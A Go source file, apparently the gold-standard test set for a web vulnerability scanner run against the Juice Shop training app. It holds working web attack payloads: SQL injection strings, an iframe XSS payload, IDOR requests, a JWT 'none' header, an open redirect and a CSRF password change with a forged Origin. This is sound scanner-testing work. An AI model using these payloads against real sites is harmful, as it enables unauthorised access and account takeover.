package goldset

import (
	"encoding/json"
	"net/http"
	"net/url"
	"strings"

	"github.com/shingeki/dast-worker/internal/contracts"
	"github.com/shingeki/dast-worker/pkg/targeturl"
)

const (
	ChallengeLoginSQLi    = "login-sqli"
	ChallengeSearchSQLi   = "search-sqli"
	ChallengeDOMXSS       = "dom-xss"
	ChallengeBasketIDOR   = "idor-basket"
	ChallengeAdminUsers   = "admin-users"
	ChallengeReviewIDOR   = "review-idor"
	ChallengeOpenRedirect = "open-redirect"
	ChallengeJWTNone      = "jwt-none"
	ChallengeFTPFile      = "ftp-confidential"
	ChallengeCSRF         = "csrf-change-password"
	ReviewIDORAuthor      = "idor-harness@shingeki.test"
)

func ExpectedChallenges(rod bool) []string {
	out := []string{ChallengeLoginSQLi, ChallengeSearchSQLi}
	if rod {
		out = append(out, ChallengeDOMXSS)
	}
	return out
}

func ExpectedAuthChallenges() []string {
	return []string{ChallengeBasketIDOR, ChallengeAdminUsers, ChallengeReviewIDOR}
}

func ExpectedCoverageChallenges() []string {
	return []string{ChallengeOpenRedirect, ChallengeJWTNone, ChallengeFTPFile, ChallengeCSRF}
}

func Catalog() []contracts.AttackItem {
	sqlPayload, _ := json.Marshal(map[string]any{
		"value":  "' OR 1=1 --",
		"values": []string{"' OR 1=1 --", "' or 1=1--"},
	})
	xssPayload, _ := json.Marshal(map[string]any{
		"value":  `<iframe src="javascript:alert(` + "`xss`" + `)">`,
		"values": []string{`<iframe src="javascript:alert(` + "`xss`" + `)">`},
	})
	return []contracts.AttackItem{
		{AttackID: "gold-sql-json", Category: "SQL_INJECTION", TargetLocation: "JSON_BODY", RiskLevel: "HIGH", Payload: sqlPayload},
		{AttackID: "gold-sql-query", Category: "SQL_INJECTION", TargetLocation: "QUERY_PARAMETER", RiskLevel: "HIGH", Payload: sqlPayload},
		{AttackID: "gold-xss-query", Category: "XSS", TargetLocation: "QUERY_PARAMETER", RiskLevel: "MEDIUM", Payload: xssPayload},
	}
}

func Vectors(targetURL string) []contracts.AttackVector {
	origin := targeturl.Origin(targetURL)
	if origin == "" {
		origin = strings.TrimRight(strings.TrimSpace(targetURL), "/")
	}

	login := contracts.NewAttackVector(origin+"/rest/user/login", http.MethodPost, "JSON_BODY")
	login.Params["email"] = ""
	login.Params["password"] = "x"
	login.Body = `{"email":"","password":"x"}`

	search := contracts.NewAttackVector(origin+"/rest/products/search?q=", http.MethodGet, "QUERY_PARAMETER")
	search.Params["q"] = ""

	hashSearch := contracts.NewAttackVector(origin+"/#/search?q=", http.MethodGet, "QUERY_PARAMETER")
	hashSearch.Params["q"] = ""

	return []contracts.AttackVector{login, search, hashSearch}
}

func AuthCatalog() []contracts.AttackItem {
	pathPayload, _ := json.Marshal(map[string]any{
		"value":  "2",
		"values": []string{"1", "2", "3"},
	})
	authorPayload, _ := json.Marshal(map[string]any{
		"value":  ReviewIDORAuthor,
		"values": []string{ReviewIDORAuthor, "jim@juice-sh.op"},
		"field":  "author",
	})
	return []contracts.AttackItem{
		{AttackID: "gold-idor-path", Category: "IDOR", TargetLocation: "URL_PATH", RiskLevel: "HIGH", Payload: pathPayload},
		{AttackID: "gold-idor-json", Category: "IDOR", TargetLocation: "JSON_BODY", RiskLevel: "HIGH", Payload: authorPayload},
	}
}

func AuthVectors(targetURL string, session Session) []contracts.AttackVector {
	origin := targeturl.Origin(targetURL)
	if origin == "" {
		origin = strings.TrimRight(strings.TrimSpace(targetURL), "/")
	}
	bid := session.Bid
	if bid == "" {
		bid = "1"
	}
	author := session.Email
	if author == "" {
		author = DefaultAdminEmail
	}

	basket := contracts.NewAttackVector(targeturl.RESTBasketURL(origin, bid), http.MethodGet, "URL_PATH")
	foreign := contracts.NewAttackVector(targeturl.RESTBasketURL(origin, targeturl.ForeignBasketID(bid)), http.MethodGet, "URL_PATH")
	users := contracts.NewAttackVector(targeturl.APIUsersURL(origin), http.MethodGet, "URL_PATH")

	review := contracts.NewAttackVector(targeturl.ProductReviewsURL(origin, "1"), http.MethodPut, "JSON_BODY")
	review.Params["message"] = "shingeki-dast"
	review.Params["author"] = author
	body, _ := json.Marshal(map[string]string{"message": "shingeki-dast", "author": author})
	review.Body = string(body)

	return []contracts.AttackVector{basket, foreign, users, review}
}

func CoverageCatalog() []contracts.AttackItem {
	redirectPayload, _ := json.Marshal(map[string]any{
		"value":  "https://github.com/juice-shop/juice-shop.evil.invalid",
		"values": []string{"https://github.com/juice-shop/juice-shop.evil.invalid"},
	})
	jwtPayload, _ := json.Marshal(map[string]any{
		"value": "none",
		"field": "Authorization",
	})
	ftpPayload, _ := json.Marshal(map[string]any{
		"value": "acquisitions.md",
	})
	csrfPayload, _ := json.Marshal(map[string]any{
		"value":  "https://evil.invalid",
		"values": []string{"https://evil.invalid"},
		"field":  "Origin",
	})
	return []contracts.AttackItem{
		{AttackID: "gold-redirect", Category: "OPEN_REDIRECT", TargetLocation: "QUERY_PARAMETER", RiskLevel: "MEDIUM", Payload: redirectPayload},
		{AttackID: "gold-jwt", Category: "JWT_CONFUSION", TargetLocation: "HEADER", RiskLevel: "HIGH", Payload: jwtPayload},
		{AttackID: "gold-ftp", Category: "PATH_TRAVERSAL", TargetLocation: "URL_PATH", RiskLevel: "HIGH", Payload: ftpPayload},
		{AttackID: "gold-csrf", Category: "CSRF", TargetLocation: "HEADER", RiskLevel: "MEDIUM", Payload: csrfPayload},
	}
}

func CoverageVectors(targetURL string, session Session) []contracts.AttackVector {
	origin := targeturl.Origin(targetURL)
	if origin == "" {
		origin = strings.TrimRight(strings.TrimSpace(targetURL), "/")
	}

	redirect := contracts.NewAttackVector(targeturl.RedirectProbeURL(origin), http.MethodGet, "QUERY_PARAMETER")
	redirect.Params["to"] = ""

	ftp := contracts.NewAttackVector(targeturl.FTPURL(origin), http.MethodGet, "URL_PATH")

	users := contracts.NewAttackVector(targeturl.APIUsersURL(origin), http.MethodGet, "HEADER")
	users.Headers = BearerAuth(session)

	csrf := contracts.NewAttackVector(
		targeturl.ChangePasswordURL(origin)+"?current="+url.QueryEscape(DefaultAdminPassword)+"&new="+url.QueryEscape(DefaultAdminPassword)+"&repeat="+url.QueryEscape(DefaultAdminPassword),
		http.MethodGet,
		"HEADER",
	)

	return []contracts.AttackVector{redirect, ftp, users, csrf}
}

func Classify(route, category string) string {
	upper := strings.ToUpper(category)
	lower := strings.ToLower(route)
	switch {
	case strings.Contains(upper, "NOSQL"):
		return ""
	case strings.Contains(upper, "SQL") && strings.Contains(lower, "/rest/user/login"):
		return ChallengeLoginSQLi
	case strings.Contains(upper, "SQL") && strings.Contains(lower, "/rest/products/search"):
		return ChallengeSearchSQLi
	case strings.Contains(upper, "XSS") && (strings.Contains(lower, "/#/search") || strings.Contains(lower, "#/search")):
		return ChallengeDOMXSS
	case strings.Contains(upper, "REDIRECT"):
		return ChallengeOpenRedirect
	case strings.Contains(upper, "JWT"):
		return ChallengeJWTNone
	case strings.Contains(upper, "PATH") && strings.Contains(lower, "/ftp"):
		return ChallengeFTPFile
	case strings.Contains(upper, "CSRF") && strings.Contains(lower, "change-password"):
		return ChallengeCSRF
	case strings.Contains(upper, "IDOR") && strings.Contains(lower, "/rest/basket"):
		return ChallengeBasketIDOR
	case strings.Contains(upper, "IDOR") && strings.Contains(lower, "review"):
		return ChallengeReviewIDOR
	case strings.Contains(upper, "IDOR") && strings.Contains(lower, "/users"):
		return ChallengeAdminUsers
	default:
		return ""
	}
}
